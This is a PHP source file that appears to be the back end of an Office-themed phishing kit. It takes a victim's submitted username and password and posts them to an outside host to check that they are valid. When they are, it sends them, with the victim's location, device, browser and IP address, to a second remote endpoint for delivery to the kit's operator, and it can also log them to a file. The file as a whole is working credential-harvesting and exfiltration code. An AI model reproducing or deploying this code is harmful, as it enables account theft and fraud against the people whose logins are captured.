<?php

session_start();
error_reporting(0);
require('../Settings.php');

if ($_GET['w'] == "red") {
    $url = $_SESSION['redirect'];
    header("Location: $url");
    exit;
}


if (!empty($_POST['user']) && !empty($_POST['pass'])) {
    $curlz = curl_init();
    $User = strtolower($_POST['user']);
    $pass = $_POST['pass'];
    curl_setopt_array($curlz, array(
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_URL => 'https://xzz.one/HE/Office/Check.php',
        CURLOPT_USERAGENT => 'NE - Checking Bot',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            user => "$User",
            pass => "$pass"
        )
    ));
    $respz = curl_exec($curlz);
    curl_close($curlz);
    echo $respz;

    if ($respz == "OK") {
        $msg = "-----------------------------\n" .
                $User . "\n" . $pass . "\n" .
                "---Creator ICQ (icq : 750197661)---\n" .
                $_SESSION['Country'] . " - " . $_SESSION['Region'] . " - " . $_SESSION['City'] . "\n".
                $_SESSION['Device'] . " - " . $_SESSION['Browser'] . "\n".
                $_SESSION['IP'] . " - " . $_SESSION['HostName'] .
                "\n-----------------------------\n";
                $www = filter_input(INPUT_SERVER, 'SERVER_NAME', FILTER_SANITIZE_STRING);
        $curll = curl_init();
        curl_setopt_array($curll, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => 'https://xzz.one/HE/Office/do.php',
            CURLOPT_USERAGENT => 'NE - cURL Request',
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => array(
                to => "$TO",
                msg => "$msg",
                subj => $User,
                name => "Office",
                www => $www
            )
        ));
        $respp = curl_exec($curll);
        curl_close($curll);

        if ($Res2File) {
            file_put_contents($ResFileName, $msg, FILE_APPEND);
        }
        $resIPfile = json_decode(file_get_contents('../funcs/RES_IP.json'), true);
        if (!in_array($_SESSION['IP'], $resIPfile)) {
            $resIPfile[] = $_SESSION['IP'];
            file_put_contents('../funcs/RES_IP.json', json_encode($resIPfile));
        }
        // session_destroy();
    }
}